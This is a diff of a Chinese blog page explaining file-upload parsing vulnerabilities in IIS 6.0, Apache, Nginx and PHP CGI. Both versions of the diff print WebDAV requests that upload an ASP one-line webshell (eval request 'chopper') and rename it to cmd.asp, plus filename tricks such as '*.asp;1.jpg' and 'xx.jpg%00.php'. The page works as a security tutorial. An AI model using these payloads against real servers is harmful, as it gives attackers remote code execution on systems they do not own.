@@ -5,22 +5,19 @@
   
   <title>文件上传之解析漏洞 | dlam</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat等```1## **IIS解析漏洞**
-IIS6.0在解析文件时存在以下两个解析漏洞1、当建立.asp、.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。12
-WebDav漏洞    WebDav是一种基于HTTP1.1协议的通信">
+  <meta name="description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat```12345## **IIS解析漏洞**IIS6.0在解析文件时存在以下两个解析漏洞```1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。
+WebDav漏洞1234567891011121314151">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上传之解析漏洞">
 <meta property="og:url" content="http://yoursite.com/2016/08/11/文件上传之解析漏洞/index.html">
 <meta property="og:site_name" content="dlam">
-<meta property="og:description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat等```1## **IIS解析漏洞**
-IIS6.0在解析文件时存在以下两个解析漏洞1、当建立.asp、.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。12
-WebDav漏洞    WebDav是一种基于HTTP1.1协议的通信">
-<meta property="og:updated_time" content="2016-08-11T11:21:07.551Z">
+<meta property="og:description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat```12345## **IIS解析漏洞**IIS6.0在解析文件时存在以下两个解析漏洞```1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。
+WebDav漏洞1234567891011121314151">
+<meta property="og:updated_time" content="2016-08-18T00:59:26.836Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件上传之解析漏洞">
-<meta name="twitter:description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat等```1## **IIS解析漏洞**
-IIS6.0在解析文件时存在以下两个解析漏洞1、当建立.asp、.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。12
-WebDav漏洞    WebDav是一种基于HTTP1.1协议的通信">
+<meta name="twitter:description" content="解析漏洞常见Web容器有IIS、Nginx、Apache、Tomcat```12345## **IIS解析漏洞**IIS6.0在解析文件时存在以下两个解析漏洞```1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。
+WebDav漏洞1234567891011121314151">
   
     <link rel="alternate" href="/atom.xml" title="dlam" type="application/atom+xml">
   
@@ -95,30 +92,18 @@ WebDav漏洞    WebDav是一种基于HTTP1.1协议的通信">
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><strong>解析漏洞</strong></h2><figure class="highlight plain"><figcaption><span>常见Web容器有IIS、Nginx、Apache、Tomcat等```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## **IIS解析漏洞**</div></pre></td></tr></table></figure>
-<p>IIS6.0在解析文件时存在以下两个解析漏洞<br>1、当建立<em>.asp、</em>.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。<br>2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
-<p>WebDav漏洞<br>    WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若<br>支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。</p>
-<p>测试步骤如下：<br>    1）通过OPTIONS探测服务器所支持的HTTP方法<br>    请求：<br>    OPTIONS / HTTP/1.1<br>    Host: www.xxxx.com<br>    2)通过PUT方法向服务器上传shell<br>    请求：<br>    PUT /a.txt HTTP/1.1<br>    Host: www.xxxx.com<br>    Content-Length: 30</p>
-<pre><code>&lt;%eval request(&quot;chopper&quot;) %&gt;
-3)通过Move或Copy方法改名
-请求：
-COPY /a.txt HTTP/1.1
-Host: www.xxxx.com
-Destination: http://www.xxxx.com/cmd.asp
-4)用DELETE方法删除文件
-请求：
-DELETE /a.txt HTTP/1.1
-Host: www.xxxx.com
-</code></pre><p>注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *Apache解析漏洞*</div></pre></td></tr></table></figure></p>
-<p>在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件”/conf/mime.types”中配置Apache可以识别的文件名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *Nginx解析漏洞*</div></pre></td></tr></table></figure></p>
-<p>对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## *PHP CGI解析漏洞*</div></pre></td></tr></table></figure></p>
+        <h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><strong>解析漏洞</strong></h2><figure class="highlight plain"><figcaption><span>常见Web容器有IIS、Nginx、Apache、Tomcat```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">## **IIS解析漏洞**</div><div class="line">IIS6.0在解析文件时存在以下两个解析漏洞</div><div class="line"></div><div class="line">```1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。</div><div class="line">2、当文件为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。</div></pre></td></tr></table></figure>
+<p><strong>WebDav漏洞</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">  WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若</div><div class="line">支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。</div><div class="line"></div><div class="line">测试步骤如下：</div><div class="line">    1）通过OPTIONS探测服务器所支持的HTTP方法</div><div class="line">    请求：</div><div class="line">    OPTIONS / HTTP/1.1</div><div class="line">    Host: www.xxxx.com</div><div class="line">    2)通过PUT方法向服务器上传shell</div><div class="line">    请求：</div><div class="line">    PUT /a.txt HTTP/1.1</div><div class="line">    Host: www.xxxx.com</div><div class="line">    Content-Length: 30</div><div class="line"></div><div class="line">    &lt;%eval request(&quot;chopper&quot;) %&gt;</div><div class="line">    3)通过Move或Copy方法改名</div><div class="line">    请求：</div><div class="line">    COPY /a.txt HTTP/1.1</div><div class="line">    Host: www.xxxx.com</div><div class="line">    Destination: http://www.xxxx.com/cmd.asp</div><div class="line">    4)用DELETE方法删除文件</div><div class="line">    请求：</div><div class="line">    DELETE /a.txt HTTP/1.1</div><div class="line">    Host: www.xxxx.com</div></pre></td></tr></table></figure></p>
+<p>注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞</p>
+<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a><strong>Apache解析漏洞</strong></h2><figure class="highlight plain"><figcaption><span>1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件"/conf/mime.types"中配置Apache可以识别的文件名```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">## **Nginx解析漏洞**</div></pre></td></tr></table></figure>
+<p>对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击 如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">## **PHP CGI解析漏洞**</div></pre></td></tr></table></figure></p>
 <p>当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问<a href="http://www.xxx.com/x.txt/x.php" target="_blank" rel="external">http://www.xxx.com/x.txt/x.php</a><br>时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析</p>
 <p>IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php<br>Nginx中：任意文件名/任意文件名.php就会被解析为php<br>```</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cirzm0x0y0027uwhro08c575r" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2016/08/11/文件上传之解析漏洞/" data-id="cirzmdjt8001xqshrpzti9sg9" class="article-share-link">Share</a>
       
         <a href="http://yoursite.com/2016/08/11/文件上传之解析漏洞/#disqus_thread" class="article-comment-link">Comments</a>
       
